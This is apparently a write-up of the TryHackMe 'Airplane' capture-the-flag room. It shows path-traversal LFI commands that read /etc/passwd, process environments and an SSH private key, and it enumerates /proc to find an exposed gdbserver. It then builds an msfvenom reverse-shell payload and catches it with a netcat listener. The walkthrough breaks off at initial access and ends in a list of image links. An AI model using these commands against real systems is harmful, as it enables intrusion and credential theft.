@@ -1,1 +1,418 @@
 # Airplane
+Airplane is a Linux-based TryHackMe room. The room teaches several important penetration-testing techniques, including network enumeration, Local File Inclusion (LFI), Linux `/proc` enumeration, gdbserver exploitation, SUID privilege escalation, and sudo wildcard/path traversal.
+The goal is to obtain both `user.txt` and `root.txt`.
+here are steps:
+1. Active recon
+scan ports by using nmap that are in range 1 upto 10000 by using this command  nmap -sC -sV -T4 10.113.132.133 -oN initial -p1-10000
+The `-oN initial` part saves the results to a file called `initial`
+![A](./images/nmap.jpg)
+We've get this three tcp ports:
+
+|Port|Service|
+|---|---|
+|`22`|SSH|
+|`6048`|Unknown service|
+|`8000`|Flask/Werkzeug web application|
+We've also verified that the web application has **LFI**.
+
+**LFI (Local File Inclusion)** means the application can be tricked into reading files from the target machine. For example, we successfully read `/etc/passwd`.
+
+ 2.  Add the target ip address for `airplane.thm` to `/etc/hosts`
+
+Run:
+
+```
+sudo nano /etc/hosts
+```
+![A](./images/host.jpg)
+
+  i could then access: 
+http://airplane.thm:8000
+![A](./images/page.jpg)
+
+3.  Identify port 6048
+![A](./images/pass1.jpg)
+![A](./images/pass2.jpg)
+I tested whether the parameter was vulnerable to path traversal:
+
+```
+?page=../../../../etc/passwd
+```
+
+The server returned the contents of `/etc/passwd`, confirming a Local File Inclusion vulnerability.
+
+The file revealed interesting users including:
+
+```
+carlos
+hudson
+```
+then test the web application:
+curl -I http://airplane.thm:8000/
+![A](./images/curl_page.jpg)
+The application was reachable.
+
+I also retrieved the main page:
+
+curl -s "http://airplane.thm:8000/?page=index.html" | head -40
+![A](./images/curl_s.jpg)
+
+Web Application Enumeration
+
+The application used a parameter called page:
+
+?page=index.html
+
+This was interesting because the application appeared to use the value of the parameter to determine which page/file should be loaded.
+
+I tested different values.
+I also filtered the output to identify users with interactive shells:
+
+curl -s "http://airplane.thm:8000/?page=../../../../etc/passwd" | grep -E '/bin/(bash|sh)$'
+![A](./images/curl_pass.jpg)
+
+The server returned the contents of /etc/passwd.
+
+This confirmed a Local File Inclusion (LFI) vulnerability.
+
+Exploring the Application
+
+After confirming LFI, I used it to investigate the web application's environment.
+
+I first examined the environment variables:
+
+curl -s "http://airplane.thm:8000/?page=../../../../proc/self/environ" | tr '\0' '\n' | head -30
+![A](./images/proc.jpg)
+I then filtered useful variables:
+
+curl -s "http://airplane.thm:8000/?page=../../../../proc/self/environ" | tr '\0' '\n' | grep -E '^(PWD|HOME|USER|PATH)='
+
+![A](./images/proc_grep.jpg)
+
+
+I also inspected the current process:
+
+curl -s "http://airplane.thm:8000/?page=../../../../proc/self/cmdline" | tr '\0' ' '
+![A](./images/curl_app.jpg)
+
+This helped establish that the web application was running as a process on the target machine.
+
+Inspecting Application Files
+
+Because the LFI allowed arbitrary local files to be read, I investigated files related to the web application.
+
+I checked the application source:
+
+curl -s "http://airplane.thm:8000/?page=../../../../home/hudson/app.py"
+![A](./images/hudson.jpg)
+
+I also checked:
+curl -s "http://airplane.thm:8000/?page=../../../../home/hudson/app/app.py"
+![A](./images/curl_hudson.jpg)
+and the application's HTML template:
+
+curl -s "http://airplane.thm:8000/?page=../../../../home/hudson/app/templates/airplane.html" | head -50
+![A](./images/curl_temp.jpg)
+I also investigated:
+
+/home/hudson/.ssh/id_rsa
+/home/hudson/.ssh/config
+/home/hudson/app/.env
+/home/hudson/app/requirements.txt
+
+For example:
+
+curl -s "http://airplane.thm:8000/?page=../../../../home/hudson/.ssh/id_rsa"
+
+These checks helped me understand the target's filesystem and application structure.
+
+Investigating Port 6048
+
+The original Nmap scan identified:
+
+6048/tcp
+
+but did not clearly identify the service.
+
+I performed a more focused scan:
+
+sudo nmap -sC -sV -p6048 MACHINE_IP
+![A](./images/p6048.jpg)
+I also tested:
+
+sudo nmap -p6048 --script x11-access MACHINE_IP
+![A](./images/p6048script.jpg)
+and connected directly to the port:
+![A](./images/p6048access.jpg)
+nc -nv MACHINE_IP 6048
+
+![A](./images/nc.jpg)
+![A](./images/nc4444.jpg)
+
+
+The service was still not immediately clear.
+
+Because we already had LFI, I used the vulnerability to investigate the Linux process information.
+
+Using /proc to Identify the Service
+
+Linux exposes information about running processes through the /proc filesystem.
+
+I investigated:
+
+/proc/<PID>/cmdline
+/proc/<PID>/status
+/proc/<PID>/fd
+/proc/net/tcp
+
+I first searched through process command lines.
+
+The following loop was used to search PIDs:
+
+for i in {1..1000}; do
+    out=$(curl -s "http://airplane.thm:8000/?page=../../../../../proc/$i/cmdline" | tr '\0' ' ')
+    if echo "$out" | grep -q "6048"; then
+        echo "$i : $out"
+    fi
+done
+![A](./images/for1.jpg)
+![A](./images/for2.jpg)
+![A](./images/for3.jpg)
+![A](./images/for4.jpg)
+
+
+This eventually identified an interesting process.
+
+I then examined the process status:
+
+curl -s "http://airplane.thm:8000/?page=../../../../../proc/534/status" | grep -E '^(Name|Pid|Uid|Gid):'
+
+
+The process information showed that the process was associated with the service listening on port 6048.
+
+Confirming Port 6048 Using /proc/net/tcp
+
+I also see:
+
+/proc/net/tcp
+
+using:
+
+curl -s "http://airplane.thm:8000/?page=../../../../../proc/net/tcp" | grep -i ':17A0'
+![A](./images/17A0.jpg)
+
+The port appeared as:
+
+17A0
+
+in hexadecimal.
+
+Converting:
+
+0x17A0 = 6048
+
+This confirmed that the process information we were investigating corresponded to the unknown service on TCP port 6048.
+
+Identifying gdbserver
+![A](./images/gdb.jpg)
+
+I continued examining the process command line:
+
+/proc/<PID>/cmdline
+
+![A](./images/gdb_arc.jpg)
+![A](./images/gdb_remote.jpg)
+
+![A](./images/gdb_target.jpg)
+
+until I identified:
+
+gdbserver
+
+![A](./images/gdb_server1.jpg)
+![A](./images/gdb_server2.jpg)
+
+
+
+
+
+The important discovery was:
+
+gdbserver
+
+running on:
+
+6048
+
+This was the key to obtaining initial access.
+
+Understanding the gdbserver Attack
+
+gdbserver is normally used for remote debugging.
+
+A debugger can connect to it and control a program running on the target.
+
+In this machine, the service was exposed on the network:
+
+Target:6048
+
+Because of this, it could be abused to execute a payload on the target.
+
+The attack path was:
+
+LFI
+ ↓
+/proc enumeration
+ ↓
+Identify port 6048
+ ↓
+Identify gdbserver
+ ↓
+Connect with GDB
+ ↓
+Execute reverse-shell payload
+13. Preparing the Payload
+
+I first verified that msfvenom was available:
+
+which msfvenom
+
+
+
+
+I generated a Linux x64 reverse-shell ELF payload:
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_TUN0_IP LPORT=4444 -f elf -o airplane_payload.elf
+
+
+
+
+I verified the generated file:
+
+file airplane_payload.elf
+
+
+
+
+I also inspected the payload to make sure it contained the expected network configuration.
+
+14. Starting the Listener
+
+Before executing the payload, I started a Netcat listener on my Kali machine:
+
+nc -lvnp 4444
+
+
+
+
+The listener was waiting for the target to connect back:
+
+Kali
+10.x.x.x:4444
+       ↑
+       |
+       |
+Target
+
+
+
+
+15. Connecting to gdbserver
+
+I started GDB:
+
+gdb
+
+
+
+
+Then connected to the remote gdbserver:
+
+(gdb) target extended-remote airplane.thm:6048
+
+
+
+
+The target architecture was checked during the process.
+
+
+
+
+16. Executing the Payload
+
+After establishing the remote GDB connection, I uploaded/configured the payload and executed it through the remote debugging session.
+
+The payload was an ELF reverse-shell executable:
+
+airplane_payload.elf
+
+
+
+
+The gdbserver executed the payload, causing the target machine to initiate a connection back to my Netcat listener.
+
+17. Obtaining the Reverse Shell
+
+The listener received the incoming connection.
+
+
+
+
+
+
+
+I then verified the account:
+
+whoami
+
+and:
+
+id
+
+The shell gave me access as:
+
+hudson
+![A](./images/1001.jpg)
+![A](./images/bash.jpg)
+![A](./images/bash5.jpg)
+![A](./images/binary.jpg)
+![A](./images/carlos1.jpg)
+![A](./images/carlos2.jpg)
+
+![A](./images/curl_d.jpg)
+![A](./images/curl_head.jpg)
+
+
+
+
+
+![A](./images/curl_ssh.jpg)
+![A](./images/elf.jpg)
+![A](./images/find_port.jpg)
+![A](./images/flag_carlos.jpg)
+
+
+![A](./images/gobuster.jpg)
+![A](./images/grep_bin.jpg)
+![A](./images/home_hudson.jpg)
+![A](./images/hudson_cat.jpg)
+![A](./images/hudson_exec.jpg)
+
+![A](./images/msf.jpg)
+![A](./images/msfvenom.jpg)
+
+
+![A](./images/p6048access.jpg)
+
+![A](./images/payload.jpg)
+
+![A](./images/proc_status.jpg)
+
+![A](./images/rshell1.jpg)
+![A](./images/rshell2.jpg)
+![A](./images/show_arch.jpg)
+![A](./images/ssh_carlos.jpg)
+![A](./images/stty.jpg)
+![A](./images/sudo_nmap.jpg)
+![A](./images/systemctl.jpg)
+![A](./images/tun0.jpg)
